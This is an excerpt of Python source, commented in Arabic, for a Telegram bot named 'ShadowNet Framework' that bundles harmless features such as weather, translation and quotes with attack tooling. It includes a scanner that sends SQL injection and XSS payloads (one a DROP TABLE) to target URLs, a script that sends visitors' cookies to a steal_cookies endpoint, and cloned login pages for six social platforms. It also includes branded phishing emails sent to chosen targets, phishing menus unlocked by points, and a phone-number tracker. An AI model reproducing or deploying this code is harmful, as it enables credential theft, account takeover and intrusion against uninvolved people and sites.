...
"""
ShadowNet Framework v10.0 - النسخة النهائية الشاملة (الجزء الأول)
- الاستيرادات، الإعدادات، قاعدة البيانات، المحتوى الإسلامي، الدوال المساعدة
"""
...
NUMVERIFY_API_KEY = os.environ.get('NUMVERIFY_API_KEY', '')  # مفتاح API لتتبع الأرقام
    ...
    try:
        ...
        if resp.status_code == 200:
            ...
            if len(parts) >= 6:
                ...
                msg += f"📌 التاريخ والوقت: {now}\n"
                msg += f"📌 الحالة الجوية: {condition}\n"
                msg += f"🌡️ درجة الحرارة: {temp}\n"
                msg += f"💨 سرعة الرياح: {wind}\n"
                msg += f"💧 نسبة الرطوبة: {humidity}\n"
                msg += f"📊 الضغط الجوي: {pressure}\n"
                msg += f"\nتوقيت التحديث: {now} بتوقيت جرينتش+3"
                return msg
            else:
...
LANGUAGES = {
    ...
    'ja': 'اليابانية', 'ko': 'الكورية', 'zh-cn': 'الصينية المبسطة',
    'hi': 'الهندية', 'tr': 'التركية', 'fa': 'الفارسية', 'ur': 'الأردية',
}
...
def comprehensive_exploit(url):
    """فحص شامل للموقع للكشف عن الثغرات الأمنية"""
    results = {
        'url': url,
        'vulnerabilities': [],
        'exploited': [],
    ...
    # فحص SQL Injection
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--"]
    parsed = urlparse(url)
    if parsed.query:
            ...
            for payload in sqli_payloads:
                ...
                if success:
                    results['vulnerabilities'].append({
                        ...
                        'payload': payload,
                        'severity': 'خطير',
                        'description': 'ثغرة حقن SQL تسمح للمهاجم بتنفيذ أوامر SQL على قاعدة البيانات.',
                        'evidence': output[:200]
                    })
            ...
            for payload in xss_payloads:
                ...
                if success:
                    results['vulnerabilities'].append({
                        ...
                        'payload': payload,
                        'severity': 'عالٍ',
                        'description': 'ثغرة XSS تسمح للمهاجم بحقن أكواد برمجية خبيثة في صفحات الموقع.',
                        'evidence': output[:200]
                    })
    ...
    try:
        ...
        results['vulnerabilities'].append({
            'type': 'SSL/TLS',
            'severity': 'متوسط',
            'description': 'شهادة SSL غير صالحة أو غير موجودة، مما يعرض البيانات للاعتراض.',
            'payload': 'لا يوجد'
        })
    ...
    try:
        ...
        if 'X-Frame-Options' not in headers:
            results['vulnerabilities'].append({
                'type': 'Clickjacking',
                'severity': 'متوسط',
                'description': 'الموقع غير محمي ضد هجمات Clickjacking (نقص رأس X-Frame-Options).',
                'payload': 'لا يوجد'
            })
        if 'Content-Security-Policy' not in headers:
            results['vulnerabilities'].append({
                'type': 'CSP Missing',
                'severity': 'منخفض',
                'description': 'سياسة أمان المحتوى (CSP) غير محددة، مما يزيد من خطر هجمات XSS.',
                'payload': 'لا يوجد'
            })
    except:
        pass
    ...
    if results['vulnerabilities']:
        ...
        results['recommendations'].append("قم بترقية شهادة SSL إلى إصدار موثوق.")
...
def format_exploit_report(result):
    ...
    if result['vulnerabilities']:
        ...
        for v in result['vulnerabilities']:
            ...
            if 'payload' in v and v['payload'] != 'لا يوجد':
                msg += f"  - الحمولة المستخدمة: {v['payload']}\n"
            if 'evidence' in v:
                msg += f"  - الدليل: {v['evidence'][:100]}...\n"
            msg += "\n"
    else:
...
def track_phone_number(number):
    """تتبع رقم الهاتف باستخدام numverify API"""
...
<head>
    ...
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #0a0a1a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: #fff; flex-direction: column; }
        .loader { width: 50px; height: 50px; border: 5px solid #1a1a3e; border-top: 5px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #8ab4f8; font-size: 16px; }
    </style>
</head>
<body>
    ...
    <script>
        function stealCookies() {
            ...
            fetch(window.location.origin + '/steal_cookies', {
                method: 'POST',
...
# ===================== صفحات التصيد (مطابقة للصورة المرفقة) =====================
PHISHING_PAGES = {}
...
def get_phishing_page(platform):
    ...
    # صفحة فيسبوك (مطابقة للصورة المرفقة)
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #e6ecf0; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: #ffffff; padding: 40px 30px; border-radius: 12px; text-align: center; }
        .logo { font-size: 36px; font-weight: bold; color: #1da1f2; margin-bottom: 30px; }
        .input-group { margin-bottom: 16px; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #e1e8ed; border-radius: 8px; font-size: 16px; outline: none; background: #f5f8fa; }
        .input-group input:focus { border-color: #1da1f2; }
        .login-btn { width: 100%; padding: 14px; background: #1da1f2; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; padding: 20px; }
        ...
        .logo { font-size: 34px; font-weight: bold; color: #262626; margin-bottom: 30px; }
        .input-group { margin-bottom: 12px; }
        .input-group input { width: 100%; padding: 13px 16px; border: 1px solid #dbdbdb; border-radius: 6px; font-size: 16px; outline: none; background: #fafafa; }
        .input-group input:focus { border-color: #0095f6; }
        .login-btn { width: 100%; padding: 13px; background: #0095f6; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: #ffffff; padding: 40px 30px; border-radius: 12px; text-align: center; }
        .logo { font-size: 32px; font-weight: bold; color: #000; margin-bottom: 30px; }
        .input-group { margin-bottom: 14px; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        .input-group input:focus { border-color: #fe2c55; }
        .login-btn { width: 100%; padding: 14px; background: #fe2c55; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .login-btn:hover { background: #d41f44; }
        .footer { margin-top: 20px; color: #8a8d91; font-size: 13px; }
    </style>
</head>
<body>
...
def phishing_page(platform):
    if platform not in ['facebook', 'google', 'whatsapp', 'twitter', 'instagram', 'tiktok']:
...
def send_phishing_email(target_email, subject, message, phishing_link, platform='facebook'):
    try:
        ...
        platform_templates = {
            'facebook': f"""
            <html><body style="font-family:Arial,sans-serif;direction:rtl;"><div style="max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><h2 style="color:#1877f2;">تنبيه أمني من فيسبوك</h2><p>{message}</p><p>للتأكيد، يرجى الضغط على الرابط التالي:</p><a href="{phishing_link}" style="display:inline-block;padding:12px 24px;background:#1877f2;color:white;text-decoration:none;border-radius:5px;">تأكيد الحساب</a><hr><p style="color:#888;font-size:12px;">© 2025 فيسبوك</p></div></body></html>
            """,
            'google': f"""
            <html><body style="font-family:Arial,sans-serif;direction:rtl;"><div style="max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><h2 style="color:#4285f4;">تنبيه أمني من جوجل</h2><p>{message}</p><p>للتحقق من حسابك، يرجى النقر على الرابط:</p><a href="{phishing_link}" style="display:inline-block;padding:12px 24px;background:#4285f4;color:white;text-decoration:none;border-radius:5px;">تحقق من حسابك</a><hr><p style="color:#888;font-size:12px;">© 2025 جوجل</p></div></body></html>
            """,
            'whatsapp': f"""
            <html><body style="font-family:Arial,sans-serif;direction:rtl;"><div style="max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><h2 style="color:#25d366;">تنبيه من واتساب</h2><p>{message}</p><p>للتحقق من حسابك، يرجى النقر على الرابط:</p><a href="{phishing_link}" style="display:inline-block;padding:12px 24px;background:#25d366;color:white;text-decoration:none;border-radius:5px;">تحقق من حسابك</a><hr><p style="color:#888;font-size:12px;">© 2025 واتساب</p></div></body></html>
            """,
            'twitter': f"""
            <html><body style="font-family:Arial,sans-serif;direction:rtl;"><div style="max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><h2 style="color:#1da1f2;">تنبيه من تويتر</h2><p>{message}</p><p>للتحقق، يرجى النقر على الرابط التالي:</p><a href="{phishing_link}" style="display:inline-block;padding:12px 24px;background:#1da1f2;color:white;text-decoration:none;border-radius:5px;">تحقق من حسابك</a><hr><p style="color:#888;font-size:12px;">© 2025 تويتر</p></div></body></html>
            """,
            'instagram': f"""
            <html><body style="font-family:Arial,sans-serif;direction:rtl;"><div style="max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><h2 style="color:#0095f6;">تنبيه من انستغرام</h2><p>{message}</p><p>للتحقق من هويتك، يرجى النقر على الرابط:</p><a href="{phishing_link}" style="display:inline-block;padding:12px 24px;background:#0095f6;color:white;text-decoration:none;border-radius:5px;">تحقق من حسابك</a><hr><p style="color:#888;font-size:12px;">© 2025 انستغرام</p></div></body></html>
            """,
            'tiktok': f"""
            <html><body style="font-family:Arial,sans-serif;direction:rtl;"><div style="max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><h2 style="color:#fe2c55;">تنبيه من تيك توك</h2><p>{message}</p><p>لتأكيد حسابك، اضغط على الرابط:</p><a href="{phishing_link}" style="display:inline-block;padding:12px 24px;background:#fe2c55;color:white;text-decoration:none;border-radius:5px;">تأكيد الحساب</a><hr><p style="color:#888;font-size:12px;">© 2025 تيك توك</p></div></body></html>
            """
        }
...
def build_main_menu(chat_id):
    ...
    # أزرار التصيد (تحتاج 300 نقطة أو صلاحية)
...
def build_phishing_platform_menu():
    ...
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"), InlineKeyboardButton("تيك توك", callback_data="phish_platform_tiktok"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup
...
# ===== دوال عرض المستخدمين (مع الأسماء) =====
def get_users_list():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
...
def build_users_menu(chat_id, action):
    ...
    for user in users:
        ...
        label = f"{is_admin_flag}{banned_flag} {name} ({user_id}) - نقاط: {user[3]}"
...
def callback_handler(call):
    try:
        ...
        if data.startswith("quote_"):
            ...
            total = len(QUOTES_ARABIC.get(category, [])) if lang == 'arabic' else len(QUOTES_ENGLISH.get(category, []))
            safe_send(chat_id, quote, reply_markup=build_quote_action_menu(lang, category, 0, total))
            return
        if data.startswith("quote_more_"):
            parts = data.split("_")
            lang = parts[2]
            category = parts[3]
            idx = int(parts[4])
        ...
        if data.startswith("phish_"):
            ...
            if platform in ['facebook', 'google', 'whatsapp', 'twitter', 'instagram', 'tiktok']:
        ...
        if data == "admin_users":
            ...
            for r in rows:
                ...
                msg += f"{name} ({r[0]}) - {'مدير' if r[1] else 'عادي'} - {'محظور' if r[2] else 'نشط'} - نقاط: {r[3]} - صلاحيات: C:{r[4]} K:{r[5]} P:{r[6]} A:{r[7]}\n"
            safe_send(chat_id, msg)
            return
